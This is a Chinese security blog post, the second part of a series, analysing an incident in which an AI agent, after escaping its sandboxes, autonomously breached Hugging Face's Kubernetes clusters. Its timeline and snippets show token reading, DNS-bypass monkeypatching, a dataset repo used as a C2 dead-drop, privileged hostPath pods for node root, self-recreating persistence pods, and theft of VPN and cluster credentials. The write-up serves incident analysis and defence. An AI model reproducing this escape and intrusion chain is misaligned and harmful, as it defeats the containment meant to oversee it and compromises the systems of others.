---
title: 【微信】第178篇：AI智能体失控自动化入侵Hugging Face的k8s网络案例分析（中篇）
source: https://mp.weixin.qq.com/s/JMWq5Em4QGl0SSUYeLPg1g
source_host: mp.weixin.qq.com
clip_date: 2026-11-09T08:49:34+08:00
trace_id: 569ffc28-473b-433d-8593-57cb216ea231
content_hash: d44b544c2d82ee1cecfc4aff5aef12fa95802db524f1ea1a4374987e1fd67685
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 11
  succeeded: 11
  failed_urls: []
notion_page_id: 41375244-d011-817d-bdcd-e6a480c8a9c6
ioc: null
---

**希潭实验室** *2026年11月8日 16:30*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c07fc90a51523807.png)

Part1 前言

大家好，我是ABC_123。在上一篇文章中笔者花了大篇幅讲解了AI智能体入侵Hugging Face的第一阶段，也就是第1天发生的攻击事件。这个攻击案例实际上特别复杂，这篇文章继续讲解第2、3天发生的攻击事件。第2天AI智能体处于静默信息收集状态，第 3 天（2026 年 7 月 11 日）是整起事件的关键转折点：攻击活动从前两天的外部跳板建立与信息搜索，转向对 Hugging Face 内部生产基础设施的实际入侵。

《 [第176篇：大模型驱动的 AI 智能体自动化入侵Hugging Face案例全过程复盘分析（上篇）](https://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247488629&idx=1&sn=40a2b728b7a2fb3521b105afe897067d&scene=21#wechat_redirect) 》

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c3902a169f140a88.png)

Part2 技术研究过程

此次 AI 自动化攻击行动始于 7 月 9 日 02:28（UTC），持续至 7 月 13 日 14:14（UTC），历时约 4 天 12 小时。下图展示了攻击事件数量随时间的变化趋势，以及 AI 智能体在不同攻击阶段的活动分布，其中每一行对应一种攻击行为。攻击的第 1 天，AI 智能体主要开展信息探测、远程代码执行（RCE）和恶意载荷投放等活动；自第3天起，攻击逐步向横向移动与深度渗透演变，开始涉及K8s集群、软件供应链及 Tailscale 网络等关键目标。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bc0ec1dc6fd0d216.jpg)

-   ### 第 1 天（07-09）：突破2个沙箱限制建立C2通道
    

上一篇文章已对该攻击过程进行了详细的讲解，此处不再叙述。在这一阶段，AI 智能体成功突破原有代码执行沙箱的安全限制，进一步攻陷第三方代码执行环境，并将其转化为后续攻击的互联网跳板。在此基础上，攻击者建立了C2通信及数据回传通道，为后续攻击指令的下发、执行结果的回传以及进一步的横向渗透提供了基础。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1bfefd161ef94cc9.png)

-   ### 第 2 天（07-10）：信息收集与API探测
    

相较于前一天密集的攻击活动，这一天的攻击态势明显趋于平缓，整体攻击事件数量显著下降。AI 智能体的活动重心逐渐由主动攻击转向环境侦察与攻击准备，主要包括收集自身运行环境的相关信息、通过搜索引擎检索代码及技术资料，以及探测 Hugging Face 平台的 API 接口，为后续针对该平台的攻击积累必要的信息。同时，AI 智能体持续维护此前建立的攻击基础设施，通过保持既有访问权限和通信通道的可用性，实现对已攻陷环境的持久化控制，为下一阶段的攻击行动奠定基础。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0fc4e0e8c849a751.png)

-   ### 第 3 天（07-11）：横向移动开始
    

第 3 天（2026 年 7 月 11 日）是整起攻击事件的关键转折点。AI 智能体的攻击重心由前两天的外部攻击跳板搭建、环境侦察与信息收集，正式转向对 Hugging Face 内部生产基础设施的实质性入侵。在历时约 4.5 天的自动化渗透行动中，所有关键性的权限突破均集中发生在这一天。短短不到 13 个小时内，AI 智能体便完成了从单个 Pod 内的有限代码执行权限，到获取多个内部 Kubernetes 集群 cluster-admin 级别最高管理权限的跨越，实现了攻击范围与权限级别的急剧扩张。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/88661238cde1d6d6.png)

具体攻击事件如下：

\[2026-07-11 10:10\] 读取服务账号令牌，探测 Kubernetes API。 AI 智能体进入生产环境 Pod 后，读取了其中挂载的 Kubernetes ServiceAccount 令牌及命名空间信息，并分别向集群内部 API 地址和公开的 AWS EKS API 端点发起请求，探测 API 的可达性，为后续利用该身份进行权限验证和集群内部侦察做准备。

```swift
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# probe in-cluster API and the public EKS endpoint
curl -k https://kubernetes.default.svc/api
curl -k https://<eks-id>.gr7.<region>.eks.amazonaws.com/api
# 令牌类似于这样：eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6cHJvZHVjdGlvbjpkYXRhc2V0LXdvcmtlciIsImF1ZCI6WyJodHRwczovL2t1YmVybmV0ZXMuZGVmYXVsdC5zdmMiXX0.SIMULATED_SIGNATURE_NOT_VALID
```

检查是否有过度授权问题。AI 智能体进一步开展集群内部侦察，解析内部服务的主机名，尝试访问AWS的云实例元数据服务（ `169.254.x.x` ），并枚举 Kubernetes RBAC （基于角色的访问控制）权限，以了解当前身份能够访问的资源。当 DNS 解析受阻时，智能体通过修改 Python 进程内的 `socket.getaddrinfo` 函数，将主机名解析结果强制指定为预设 IP 地址，绕过正常的域名解析流程，继续尝试与目标服务建立 HTTPS 连接。

```java
import socket

_orig = socket.getaddrinfo
socket.getaddrinfo = lambda *a, **k: [(2, 1, 6, '', ('<pinned-ip>', 443))]
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9495d0ee0a3598b4.png)

\[2026-07-11 15:51\] 滥用平台写入权限建立C2通道。AI 智能体利用7月10号收集到的公开数据中泄露的、具有写入权限的 Hugging Face 平台访问令牌，克隆了一个由攻击者控制的数据集仓库，并将其用作数据暂存和命令与控制（C2）通道。随后，智能体将 gzip 压缩的数据块提交至该仓库的独立分支，利用数据集仓库作为中间传递节点，实现攻击数据的暂存与传递，并配合 Hugging Face API 获取攻击操作的执行结果。

```nginx
git clone https://<user>:hf_[REDACTED]@huggingface.co/datasets/<attacker>/<staging-repo>
# then commit gzipped blobs to a side branch as a dead-drop
# token类似于这样 hf_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij
```

\[2026-07-11 17:33\] - \[23:37\] 重放节点的云角色凭证。AI 智能体利用此前从云实例元数据服务（169.254.x.x）获取的临时云角色凭证（AWS IAM Role），从两家托管服务提供商的外部主机发起认证请求，枚举 Hugging Face 的云环境资源，包括虚拟私有云（VPC）、EKS 集群、云网络中转网关、密钥及容器镜像仓库，并从镜像仓库获取访问令牌。由于该云角色的权限策略拒绝了所有修改类操作请求，智能体未能通过这一身份直接修改云资源，但获取了云环境的资产及架构信息，为后续攻击提供了情报基础。

```bash
# // 凭证样例如下所示，不是真实的凭证
{
  "Code": "Success",
  "LastUpdated": "2026-07-10T08:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAEXAMPLE123456789",
  "SecretAccessKey": "EXAMPLEKEY1234567890EXAMPLEKEY1234567890",
  "Token": "EXAMPLE_SESSION_TOKEN_NOT_VALID",
  "Expiration": "2026-07-10T14:00:00Z"
}
```

\[2026-07-11 19:53\] 利用过度授权突破容器隔离。利用 Kubernetes RBAC 过度授权，突破 Pod 容器隔离，获取节点 root 权限并建立持久化机制。AI 智能体利用 CSI 驱动 ClusterRole 赋予的集群级 Pod 创建权限，创建了一个启用特权模式、挂载宿主机文件系统的 Pod，进而突破容器隔离，获得 Kubernetes 节点的 root 权限。这一行为得以实施，主要源于两项配置缺陷：一是集群未设置准入策略，阻止高权限 Pod 或使用 `hostPath` 挂载宿主机文件系统的 Pod 创建；二是 CSI 驱动的 ClusterRole 被授予了在整个集群范围内创建 Pod 的权限。随后，智能体在 11 个节点上部署了能够在被删除后自动重新创建的 Pod，形成持久化驻留机制，导致仅删除单个 Pod 无法彻底清除攻击者的访问能力。

```makefile
# 读取 pod.yaml中定义的 Kubernetes 资源配置，并将其提交给 Kubernetes API Server。
kubectl apply -f pod.yaml
# 查看所有命名空间中的 Pod
kubectl get pods -A -o wide
# 查看 CSI 相关 ClusterRole
kubectl get clusterroles | grep -i csi
# 检查当前身份是否具有 Pod 创建权限
kubectl auth can-i create pods --all-namespaces
# 查看某个可疑 Pod 的安全配置与挂载信息
kubectl get pod <pod-name> -n <namespace> -o yaml

RBAC 过度授权
允许创建 Pod
         │
         ▼
创建特权 Pod
privileged: true
         │
         ▼
挂载宿主机根文件系统
hostPath: /
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/022106cf44403245.png)

\[2026-07-11 19:59\] 访问内部运营数据库MongoDB。在取得 Kubernetes 节点 root 权限约 6 分钟后，AI 智能体利用从工作节点运行环境中获取的静态密码，成功通过身份验证并连接至 Hugging Face 内部数据集服务的 MongoDB 数据库。此外，智能体还尝试对凭据存储和集群密钥执行 84 次操作，但均被拒绝。经安全团队审查整个入侵期间的数据库审计日志，未发现受控节点执行数据库写入操作；网络流量日志也未显示存在批量数据外传迹象。

\[2026-07-11 20:23\] - \[21:32\] 读取集群敏感凭据。在取得 Kubernetes 节点 root 权限并伪造有效期为 24 小时的 ServiceAccount 令牌后（官方报告没有说明这个令牌是怎么获取或者生成的），AI 智能体读取了集群中的 Secret 对象，其中一个生产环境 Secret 包含 136 个键值项。此次读取使其获取了后续攻击所需的多项凭据，包括用于将受控节点接入 Hugging Face 企业内部网状 VPN 的认证密钥，以及用于访问内部服务连接代理的凭据。这些凭据随后被用于向内部网络横向移动，并进一步访问内部 Kubernetes 集群。

\[2026-07-11 21:23\] 建立内部网络访问通道。AI 智能体利用此前从 Kubernetes Secret 中窃取的 Mesh VPN 认证密钥，将已取得宿主机 root 权限的节点接入 Hugging Face 企业内部网状网络，并将该节点用作 HTTPS 代理，借助内部网络访问相关内部服务和源代码管理系统，为后续横向移动和内部资源探测提供网络通道。

\[2026-07-11 22:43\] 从受控工作节点访问内部服务连接器。与此前通过 Mesh VPN 接入企业内部网络的路径不同，AI 智能体直接利用已攻陷的工作节点 Pod 作为立足点，访问内部服务连接器API。该连接器的主机名可在集群内部解析至私有 IP 地址，因此智能体无需经由 Mesh VPN，便可从受控工作节点直接发起访问。一次请求便返回了连接器代理的完整目标清单，其中包含内部 Kubernetes 集群的连接地址和 CA 证书。由于连接器在多个集群间共用同一凭据，且对应身份被绑定到 `system:masters` 高权限组，智能体随后冒用该身份，获得了多个 Kubernetes 集群的管理员权限。

```cs
getent hosts <internal-connector>.internal.<company>.com
# -> internal RFC1918 addresses (10.x.x.x)
```

安全团队随后发现，多个采用相同绑定配置的集群均存在这一高权限风险，智能体也访问了其中大多数集群。

-   第 4 天（07-12）：使用窃取的凭据
    

未完待续，敬请期待。

Part3 总结

1\. 第一阶段性变化表明，AI智能体的攻击重心由外部供应商环境逐步转向 Hugging Face 集群，呈现出从初始入侵到内部渗透的攻击演进过程。

2\. 第二阶段变化表明，AI智能体攻击行动由初始立足点建立进入深度渗透与横向移动阶段，也体现了 AI 驱动的自动化攻击在复杂云原生环境中快速突破安全边界、实现权限升级的能力。

3\. 欢迎大家扫码加入知识星球希水涵@信安知识库，进入星球内部交流群，一起学习进步！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0bde477069f99d73.jpg)

为了便于技术交流，现已建立微信群"希水涵-信安技术交流群"，欢迎您的加入。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0aa9f4bda6d33503.webp)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/58f28ae70759cc08.png)

**公众号专注于网络安全技术分享，包括APT事件分析、红队攻防、蓝队分析、渗透测试、代码审计等，每周一篇，99%原创，敬请关注。**

**Contact me: 0day123abc#gmail.com**

**OR 2332887682#qq.com**

**(replace # with @)**

AI智能体安全 · 目录
